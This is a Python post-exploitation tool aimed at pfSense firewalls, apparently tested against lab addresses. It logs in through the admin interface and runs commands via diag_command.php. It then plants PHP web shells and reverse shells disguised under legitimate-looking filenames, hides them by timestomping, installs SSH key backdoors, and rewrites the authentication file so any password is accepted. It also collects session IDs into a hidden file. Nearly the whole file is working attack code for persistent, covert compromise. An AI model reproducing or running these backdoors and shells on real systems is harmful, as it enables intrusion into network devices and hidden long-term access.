#!/usr/bin/python3

## Ideas:
# Fix dates on certain files (touch -r) - DONE
# Dump PHPSESSIDs to hidden file - DONE
# Test PHPSESSIDs to find any potential usable cookies
# Potentially chmod files so unable to change
# SSH needs keys to connect, maybe create a "SSH bootstrap" - DONE
# Fix login so backdoor password as opposed to all passwords



import requests
import re
from random import randint
import os
import base64
import urllib.parse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import ipaddress 



ip = '"' + str(int(ipaddress.ip_address('192.168.44.128'))) +  '"'

url = ""
username = ""
password = ""

pfsenseIP = "192.168.44.132"
url = "https://192.168.44.132"
username = "admin"
password = "pfsense"
csrf = ""
cmdOutput = ""
ids = ""
idsList = []

## Web Shells
level1 = """echo '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>' > shell.php"""

level2 = """echo '<?php $up = """ + ip + """; $user = ip2long($_SERVER["REMOTE_ADDR"]); if($up == $user){ if(isset($_REQUEST["c"])){ echo "<pre>"; $c = ($_REQUEST["c"]); $cmd = base64_decode($c); system($cmd); echo "</pre>"; die; }}else{echo hellothere;};?>' > vpn_l2tp_admin.php"""


## Reverse Shells
level1Rev = """echo '<?php if(isset($_REQUEST["ip"]) && isset($_REQUEST["port"])){ $i = $_REQUEST["ip"]; $p = $_REQUEST["port"];$sock=fsockopen($i,$p);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); } ?>' > RevShell.php"""

level2Rev = """echo '<?php $up = """ + ip + """; $user = ip2long($_SERVER["REMOTE_ADDR"]); if($up == $user){ if(isset($_REQUEST["host"])){ $h = $_REQUEST["host"]; $decoded = base64_decode($h); $array = explode(" ",$decoded); $i = $array[0]; $p = $array[1]; $sock=fsockopen($i,$p);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); }}else{echo hellothere;}?>' > interfaces_ipv6.php""" 

loggedIn = False
regex = "sid:.*;var"
cmd_regex = "(?s)<pre>.*<\/pre>"
session = requests.session()
session.verify = False

def simpleGET(path, value, cmd):
    global url, csrf, ids

    simple_url = url + path + value
    print(simple_url)
    simple_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Te": "trailers"}
    r = session.get(simple_url, headers=simple_headers, verify=False)
    if(cmd == 0): csrf = re.findall(regex, r.text)[0][:-5]
    if(cmd == 1): parseCMDOutput(r.text)
    if(cmd == 3): print("Starting reverse shell")
    if(cmd == 4): ids = r.text

def simplePOST(path, value, cmd, postdata):
    global url

    simple_url = url + path
    simple_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "Accept-Encoding": "gzip, deflate",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Te": "trailers",
            "Content-Type": "application/x-www-form-urlencoded"}

    r = session.post(simple_url, headers=simple_headers, data=postdata, verify=False)

    if(cmd == 0): csrf = re.findall(regex, r.text)[0][:-5]
    if(cmd == 1): print(r.text)

## SSH Functions
def toggleSSH():
    simpleGET("/", "", 0)
    loginPOST()
    cmdGET("echo 'y' | /etc/rc.initial.toggle_sshd")

def addSSHKey():
    global output

    simpleGET("/", "", 0)
    loginPOST()
    
    # Create SSH keys
    cmdGET('HOSTNAME=`hostname` ssh-keygen -t rsa -C "$HOSTNAME" -f "$HOME/.ssh/id_rsa" -P "" && cat ~/.ssh/id_rsa.pub')
    cmdGET("touch -r ~/.cshrc ~/.ssh")

    # Read private key
    cmdGET("cat ~/.ssh/id_rsa")
    with open('id_rsa', 'w') as f:
        f.write(cmdOutput + "\n")
    # Permissions for private key
    os.popen("chmod 600 id_rsa")

    # Create authorized keys so don't need password
    cmdGET("cp ~/.ssh/id_rsa.pub ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys")

    # Hide creation date
    cmdGET("touch -r ~/.cshrc ~/.ssh")
    cmdGET("touch -r ~/.cshrc ~/.ssh/id_rsa")
    cmdGET("touch -r ~/.cshrc ~/.ssh/id_rsa.pub")
    cmdGET("touch -r ~/.cshrc ~/.ssh/authorized_keys")

def cmdSSH(user, cmd):
    global cmdOutput, pfsenseIP

    cmdOutput = os.system("ssh %s@%s -i id_rsa '%s'" % (user,pfsenseIP,cmd))

def testIDs():
    global url, ids, idsList

    simpleGET("/.ids.php", "", 4)
    split_ids = ids.split("\n")

    for i in split_ids:
        i_bytes = i.encode("ascii")
        
        i_decoded = base64.b64decode(i_bytes).decode("ascii")
        idsList.append(i_decoded)

    print(idsList)


# Shell Accesses
def skidyAccess():
    global url
    cmd = ""

    while(cmd != "fin"):
        cmd = input("$: ")
        cmd_encoded = urllib.parse.quote_plus(cmd)
        simpleGET("/shell.php?cmd=", cmd_encoded, 1)

def amatuerAccess():
    global url
    cmd = ""

    while(cmd != "fin"):
        cmd = input("$: ").encode("ascii")
        cmd_encoded = base64.b64encode(cmd).decode("ascii")
        simpleGET("/vpn_l2tp_admin.php?c=",cmd_encoded, 1)

def proAccess():
    global url
    cmd = ""

    while(cmd != "fin"):
        cmd = input("$: ").encode("ascii")
        cmd_encoded = base64.b64encode(cmd).decode("ascii")

        pro_data = {"settings": cmd_encoded}
        simplePOST("/system_firewall_manager.php", cmd_encoded, 1, pro_data)

def leetAccess():
    global url, csrf
    cmd = ""

    while(cmd != "fin"):
        cmd = input("$: ").encode("ascii")
        cmd_encoded = base64.b64encode(cmd).decode("ascii")

        simpleGET("/", "", 0)
        leet_data = {"__csrf_magic": csrf, "logindata": cmd_encoded}
        simplePOST("/", "", 1, leet_data)

# WebShell Uploads
def skidyWeb():
    global url
    simpleGET("/index.php", "", 0)
    loginPOST()
    cmdGET(level1)
    print("Visit %s/shell.php?cmd=id" % url)
    print("Change id to required command")
    print("No credentials needed to access :)")

def amatuerWeb():
    global url
    simpleGET("/index.php", "", 0)
    loginPOST()
    cmdGET(level2)
    print("Shell uploaded to %s/vpn_l2tp_admin.php" % url)
    print("The variable is base64 encoded so either do it manually or use the NoSense function")
    print("No credentials needed to access :)")

def proWeb():
    global url

    level3 = "echo '"
    with open('Files/proweb.php', 'r') as file:
        data = file.read()
    data_mod = data.replace("HEYBEAR", ip).encode("ascii")
    level3 += base64.b64encode(data_mod).decode("ascii")

    level3 += "' > temp_cache"

    level3cmd = """php -r '$file = file_get_contents("temp_cache", true);echo base64_decode($file);' > system_firewall_manager.php"""

    level3tad = "touch -r index.php interfaces_ipv6.php"

    simpleGET("/", "", 0)
    loginPOST()
    cmdGET(level3)
    cmdGET(level3cmd)
    cmdGET(level3tad)
    print("Shell uploaded to %s/system_firewall_manager.php" % url)
    print("The variable is base64 encoded and accepted via POST requests only")
    print("No credentials needed to access :)")


def leetWeb():
    global url

    ## auth.inc
    level4 = "echo '"
    with open('Files/auth.inc', 'r') as file:
        data = file.read()
    data_mod = data.replace("HEYBEAR", ip).encode("ascii")
    file.close()
    level4 += base64.b64encode(data_mod).decode("ascii")
    level4 += "' > temp_cache"


    level4cmd = """php -r '$file = file_get_contents("temp_cache", true);echo base64_decode($file);' > /etc/inc/auth.inc"""
    level4tad = "touch -r index.php /etc/inc/auth.inc"

    ## index.php
    level4index = "echo '"
    with open('Files/index.php', 'r') as file:
        data = file.read().encode("ascii")
    file.close()
    level4index += base64.b64encode(data).decode("ascii")
    level4index += "' > temp_cache"


    level4indexcmd = """php -r '$file = file_get_contents("temp_cache", true);echo base64_decode($file);' > index.php"""
    level4indextad = "touch -r /etc/inc/auth.inc index.php"

    simpleGET("/", "", 0)
    loginPOST()
    # auth.inc
    cmdGET(level4)
    cmdGET(level4cmd)
    cmdGET(level4tad)
    # index.php
    cmdGET(level4index)
    cmdGET(level4indexcmd)
    cmdGET(level4indextad)


    try:
        cmdGET("reboot")
    except:
        print("Rebooting")

## Reverse Shells
def skidyRev():
    global url
    simpleGET("/index.php", "", 0)
    loginPOST()
    cmdGET(level1Rev)
    print("Visit %s/Revshell.php?ip=<IP>port=<PORT>" % url)
    print("Or use the automatic rev shell popper")
    print("No credentials needed to access :)")

def amatuerRev():
    global url
    simpleGET("/index.php", "", 0)
    loginPOST()
    cmdGET(level2Rev)
    print("Use the automatic rev shell popper please")
    print("No credentials needed to access :)")

def proRev():
    global url

    level3Rev = "echo '"
    with open('Files/prorev.php', 'r') as file:
        data = file.read()
    data_mod = data.replace("HEYBEAR", ip).encode("ascii")
    file.close()
    level3Rev += base64.b64encode(data_mod).decode("ascii")
    level3Rev += "' > temp_cache"

    level3cmd = """php -r '$file = file_get_contents("temp_cache", true);echo base64_decode($file);' > system_advanced_routes.php"""
    level3tad = "touch -r index.php system_advanced_routes.php"

    simpleGET("/index.php", "", 0)
    loginPOST()

    cmdGET(level3Rev)
    cmdGET(level3cmd)
    cmdGET(level3tad)
    print("Use the automatic rev shell popper please")
    print("No credentials needed to access :)")


def parseCMDOutput(responseText):
    global cmdOutput

    cmdOutput = re.findall(cmd_regex, responseText)[0][5:-6]

    print(cmdOutput)

def cmdPOST(csrf, cmd):
    cmd_encoded = urllib.parse.quote_plus(cmd)
    mp_boundary = str(randint(100000000000000000000000000000, 999999999999999999999999999999))

    cmd_url = url + "/diag_command.php"
    cmd_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "multipart/form-data; boundary=---------------------------" + mp_boundary,
            "Origin": url,
            "Referer": url + "/diag_command.php",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Te": "trailers"}
    cmd_data = "-----------------------------"  + mp_boundary +"\r\n"
    cmd_data += 'Content-Disposition: form-data; name=\"__csrf_magic\"\r\n\r\n'
    cmd_data += csrf + "\r\n"
    cmd_data += "-----------------------------" + mp_boundary + "\r\n"
    cmd_data += 'Content-Disposition: form-data; name=\"txtCommand\"\r\n\r\n'
    cmd_data += cmd + "\r\n"
    cmd_data += "-----------------------------" + mp_boundary + "\r\n"
    cmd_data += "Content-Disposition: form-data; name=\"txtRecallBuffer\"\r\n\r\n"
    cmd_data += cmd_encoded + "\r\n"
    cmd_data += "-----------------------------" + mp_boundary + "\r\n"
    cmd_data += "Content-Disposition: form-data; name=\"submit\"\r\n\r\n"
    cmd_data += "EXEC\r\n"
    cmd_data += "-----------------------------" + mp_boundary + "\r\n"
    cmd_data += "Content-Disposition: form-data; name=\"dlPath\"\r\n\r\n\r\n"
    cmd_data += "-----------------------------" + mp_boundary + "\r\n"
    cmd_data += "Content-Disposition: form-data; name=\"ulfile\"; filename=\"\"\r\n"
    cmd_data += "Content-Type: application/octet-stream\r\n\r\n\r\n"
    cmd_data += "-----------------------------" + mp_boundary + "\r\n"
    cmd_data += "Content-Disposition: form-data; name=\"txtPHPCommand\"\r\n\r\n\r\n"
    cmd_data += "-----------------------------" + mp_boundary + "--\r\n"
    r = session.post(cmd_url, headers=cmd_headers, data=cmd_data)

    parseCMDOutput(r.text)

def cmdGET(cmd):
    global url 
    cmd_url = url + "/diag_command.php"
    cmd_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Referer": url,
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Te": "trailers"}
    r = session.get(cmd_url, headers=cmd_headers)
    csrf_token = re.findall(regex, r.text)[0][:-5]
    cmdPOST(csrf_token, cmd)



def loginPOST():
    global url, csrf, username, password
    # Actual Log In
    login_url = url + "/"
    login_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
             "Accept-Encoding": "gzip, deflate",
             "Content-Type": "application/x-www-form-urlencoded",
             "Origin": url,
             "Referer": url + "/index.php",
             "Upgrade-Insecure-Requests": "1",
             "Sec-Fetch-Dest": "document",
             "Sec-Fetch-Mode": "navigate",
             "Sec-Fetch-Site": "same-origin",
             "Sec-Fetch-User": "?1",
             "Te": "trailers"}
    login_data = {"__csrf_magic": csrf, "usernamefld": username, "passwordfld": password, "login": "Sign In"}
    r = session.post(login_url, headers=login_headers, data=login_data)

    if("pfSense - Login" in r.text): print("Login Failed"); loggedIn = False
    else: print("Logged In Successfully")


def details():
    global url,username,password,ip

    temp = input("Your IP: ")
    ip = '"' + str(int(ipaddress.ip_address(temp))) +  '"'
    url = input("Pfsense URL: ")
    username = input("Pfsense Username: ")
    password = input("Pfsense Password: ")

def menu():
    global csrf
    choice1 = input("Pick One:\n(1): Upload a WebShell\n(2): Access WebShell\n(3): Upload a ReverseShell\n(4): ReverseShell Popper\n(5): Backend Backdoors\n(9): Execute a cmd\n(10): Full Web Backdoor\n-> ")
    if(choice1 == "1"):
        choice2 = input("Pick Level\n(1): Skidy\n(2): Amatuer\n(3): Pro\n-> ")
        if(choice2 == "1"): skidyWeb()
        if(choice2 == "2"): amatuerWeb()
        if(choice2 == "3"): proWeb()
    if(choice1 == "2"):
        choice2 = input("Pick Level\n(1): Skidy\n(2): Amatuer\n(3): Pro\n(4): Leet\n-> ")
        if(choice2 == "1"): skidyAccess()
        if(choice2 == "2"): amatuerAccess()
        if(choice2 == "3"): proAccess()
        if(choice2 == "4"): leetAccess()
    if(choice1 == "3"):
        choice2 = input("Pick Level\n(1): Skidy\n(2): Amatuer\n(3): Pro\n-> ")
        if(choice2 == "1"): skidyRev()
        if(choice2 == "2"): amatuerRev()
        if(choice2 == "3"): proRev()
    if(choice1 == "4"):
        ip = input("RHOST IP:\n-> ")
        port = input("RPORT PORT:\n-> ")
        schoice = input("Want a NC listener? (1) Yes (2) No\n-> ")
        if(schoice == "1"): os.popen("qterminal -e nc -lvnp 4455")
        choice2 = input("Pick Level\n(1): Skidy\n(2): Amatuer\n(3): Pro\n(4): Leet\n-> ")
        if(choice2 == "1"):
            path = "/RevShell.php?ip=" + ip + "&port=" + port
            simpleGET(path, "", 3)
        if(choice2 == "2"):
            address = (ip + " " + port).encode("ascii")
            add_encoded = base64.b64encode(address).decode("ascii")
            path = "/interfaces_ipv6.php?host="
            simpleGET(path, add_encoded, 3)
        if(choice2 == "3"):
            address = (ip + " " + port).encode("ascii")
            add_encoded = base64.b64encode(address).decode("ascii")
            path = "/system_advanced_routes.php"
            pro_data= {"route": add_encoded}
            simplePOST(path, "", 1, pro_data)
        if(choice2 == "4"):
            address = (ip + " " + port).encode("ascii")
            add_encoded = base64.b64encode(address).decode("ascii")
            path = "/"
            simpleGET("/", "", 0)
            leet_data = {"__csrf_magic": csrf, "loggedin": add_encoded}
            simplePOST(path, "", 1, leet_data)

    if(choice1 == "5"):
        choice2 = input("Pick Backdoor\n(1): Cronjob\n(2): SSH Keys\n(3): Add User\n(10): Toggle SSH\n-> ")
        if(choice2 == "2"): addSSHKey()
        if(choice2 == "10"): toggleSSH()
    if(choice1 == "9"):
        simpleGET("/", "", 0)
        loginPOST()
        cmd = input("CMD: ")
        cmdGET(cmd)
    if(choice1 == "10"):
        print("##### Leet Backdoor #####")
        print("This will create:\n-Login will accept any password with valid username\n-Web shell on root page\n-Reverse shell on root page\n-PHPSESSIDs put in .ids\n")
        choice2 = input("This will require a restart of the firewall, is that ok? (1)Yes (2)No\n-> ")
        if(choice2 == "1"): leetWeb()
        if(choice2 == "2"): print("Safe one fam")

def main():
    testIDs()
#    details()
#    menu()

if __name__ == "__main__":
    main()

